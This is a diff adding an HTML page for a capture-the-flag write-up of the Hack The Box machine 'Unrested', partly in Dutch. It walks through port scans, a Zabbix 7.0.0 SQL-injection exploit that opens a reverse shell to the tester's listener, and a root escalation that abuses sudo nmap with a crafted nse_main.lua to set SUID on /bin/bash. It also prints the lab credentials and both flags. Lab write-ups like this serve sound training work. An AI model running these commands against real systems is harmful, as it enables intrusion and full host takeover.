@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="![[Pasted image 20250306132238.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.231.176 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:57 CET Nmap scan report for unrested.htb (10.129.231.176) Host is up (0.026s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10050/tcp open zabbix-agent 10051/tcp open zabbix-trapper Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-unrested/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="![[Pasted image 20250306132238.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.231.176 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:57 CET Nmap scan report for unrested.htb (10.129.231.176) Host is up (0.026s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10050/tcp open zabbix-agent 10051/tcp open zabbix-trapper Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+  <meta itemprop="wordCount" content="1109">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="![[Pasted image 20250306132238.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.231.176 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:57 CET Nmap scan report for unrested.htb (10.129.231.176) Host is up (0.026s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10050/tcp open zabbix-agent 10051/tcp open zabbix-trapper Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-unrested/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>![[Pasted image 20250306132238.png]]</p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap -p- 10.129.231.176
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:57 CET
+Nmap scan report for unrested.htb (10.129.231.176)
+Host is up (0.026s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10050/tcp open  zabbix-agent
+10051/tcp open  zabbix-trapper
+
+Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the gedatialized port scan go to get more information from the services dien are open the ip address.</p>
+<pre tabindex="0"><code>nmap -p22,80,10050,10051 -sCV 10.129.231.176 -vvvv
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:58 CET
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+Initiating Ping Scan at 13:58
+Scanning 10.129.231.176 [4 ports]
+Completed Ping Scan at 13:58, 0.03s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 13:58
+Scanning unrested.htb (10.129.231.176) [4 ports]
+Discovered open port 22/tcp on 10.129.231.176
+Discovered open port 80/tcp on 10.129.231.176
+Discovered open port 10051/tcp on 10.129.231.176
+Discovered open port 10050/tcp on 10.129.231.176
+Completed SYN Stealth Scan at 13:58, 0.06s elapsed (4 total ports)
+Initiating Service scan at 13:58
+Scanning 4 services on unrested.htb (10.129.231.176)
+Completed Service scan at 13:58, 6.64s elapsed (4 services on 1 host)
+NSE: Script scanning 10.129.231.176.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 5.16s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.49s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+Nmap scan report for unrested.htb (10.129.231.176)
+Host is up, received echo-reply ttl 63 (0.024s latency).
+Scanned at 2025-03-06 13:58:39 CET for 12s
+
+PORT      STATE SERVICE             REASON         VERSION
+22/tcp    open  ssh                 syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
+|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
+80/tcp    open  http                syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+10050/tcp open  tcpwrapped          syn-ack ttl 63
+10051/tcp open  ssl/zabbix-trapper? syn-ack ttl 63
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:58
+Completed NSE at 13:58, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
+           Raw packets sent: 8 (328B) | Rcvd: 7 (284B)
+</code></pre><p>If we go to the webpage can you see that we will come on a login page of the zabbix monitoring tool. The credentials to login on the monitoring tool where allready provided by HTB. So i will use the following credentials to login on the monitoring tool.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>matthew</td>
+          <td>96qzn0h2e1k3</td>
+      </tr>
+      <tr>
+          <td>As you can see below are we now logged in as the user matthew on Zabbix.</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<p>![[Pasted image 20250306133004.png]]</p>
+<p>There i can see that fronted of Zabbix is not updated and that Zabbix is running on version 7.0.0</p>
+<p>![[Pasted image 20250306133344.png]]</p>
+<p>Nu ben ik dus gaan zoeken naar exploit voor deze versie en hierbij heb ik de volgende exploit gevonden. <a href="https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE">https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE</a>.
+Ik ben de exploit gaan uitvoeren, Ik heb een listener gestart heb dus een connectie gekregen met de zabbix server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Unrested/Zabbix-CVE-2024-42327-SQL-Injection-RCE]
+└─$ python exploit.py         
+
+        _______    ________    ___   ____ ___  __ __        __ __ ___  ________  _____
+       / ____/ |  / / ____/   |__ \ / __ \__ \/ // /       / // /|__ \|__  /__ \/__  /
+      / /    | | / / __/________/ // / / /_/ / // /_______/ // /___/ / /_ &lt;__/ /  / / 
+     / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/__  __/ __/___/ / __/  / /  
+     \____/  |___/_____/    /____/\____/____/ /_/          /_/ /____/____/____/ /_/   
+    
+API URL: http://unrested.htb/zabbix/api_jsonrpc.php
+username: matthew
+password: 96qzn0h2e1k3
+lhost (local ip address for reverse shell): 10.10.16.31
+lport (port number for reverse shell): 4444
+Authenticating...
+Login successful! Auth token: b69c112fa3fa8502c73610ee04122a32
+Starting data extraction...
+Extracting admin session: 2bc515c26b8ce1f49646c8f4c652ae03
+Admin session extracted: 2bc515c26b8ce1f49646c8f4c652ae03
+host.get response: {&#39;jsonrpc&#39;: &#39;2.0&#39;, &#39;result&#39;: [{&#39;hostid&#39;: &#39;10084&#39;, &#39;host&#39;: &#39;Zabbix server&#39;, &#39;interfaces&#39;: [{&#39;interfaceid&#39;: &#39;1&#39;}]}], &#39;id&#39;: 1}
+Reverse shell command executed successfully.
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                                     
+listening on [any] 4444 ...
+connect to [10.10.16.31] from (UNKNOWN) [10.129.231.176] 44204
+bash: cannot set terminal process group (2003): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@unrested:/$
+</code></pre><p>Nu ben ik dus gaan kijken in de home folder bij de user matthew en daar heb je dan eerste flag, de user flag.</p>
+<p><code>user flag = ba1abd16fcf4ce6f71e574d459a22c65</code></p>
+<pre tabindex="0"><code>zabbix@unrested:/$ cd home
+cd home
+zabbix@unrested:/home$ ls
+ls
+matthew
+zabbix@unrested:/home$ cd matt
+cd matthew/
+zabbix@unrested:/home/matthew$ ls
+ls
+user.txt
+zabbix@unrested:/home/matthew$ cat user.txt
+cat user.txt
+ba1abd16fcf4ce6f71e574d459a22c65
+zabbix@unrested:/home/matthew$
+</code></pre><p>From there i did the sudo -l command to see if i can execute a command with the sudo rights without knowing the password.</p>
+<p>Then i have executed the following code. The &ndash;datadir option allows you to specify a custom directory where default scripts and other essential nmap files are stored. By default, this directory is set to /usr/share/nmap.</p>
+<p>One key file in this directory is nse_main.lua, the default script file that can be executed using the -sC flag. To exploit this, a new file can be created at /tmp/nse_main.lua containing the command os.execute(&ldquo;chmod 4755 /bin/bash&rdquo;). When localhost is scanned with the -sC option enabled, this sets /bin/bash with the SUID bit. As a result, a shell can be spawned with the effective UID of the root user.</p>
+<pre tabindex="0"><code>zabbix@unrested:/$ echo &#39;os.execute(&#34;chmod 4755 /bin/bash&#34;)&#39; &gt; /tmp/nse_main.lua
+&lt;xecute(&#34;chmod 4755 /bin/bash&#34;)&#39; &gt; /tmp/nse_main.lua
+zabbix@unrested:/$ sudo /usr/bin/nmap --datadir=/tmp -sC localhost
+sudo /usr/bin/nmap --datadir=/tmp -sC localhost
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-06 14:18 UTC
+nmap.original: nse_main.cc:619: int run_main(lua_State*): Assertion `lua_isfunction(L, -1)&#39; failed.
+Aborted
+zabbix@unrested:/$ /bin/bash -p
+/bin/bash -p
+</code></pre><p>As you can see do we have now the permissions to see the root.txt file.</p>
+<pre tabindex="0"><code>bash-5.1# id
+
+uid=114(zabbix) gid=121(zabbix) euid=0(root) groups=121(zabbix)
+bash-5.1# cd /root
+cd /root
+bash-5.1# ls
+ls
+root.txt
+bash-5.1# cat root.txt
+cat root.txt
+f6b9476b284711f6dfb59a8053fcec93
+</code></pre><p><code>root flag = f6b9476b284711f6dfb59a8053fcec93</code></p>
+<p>![[Pasted image 20250306151931.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
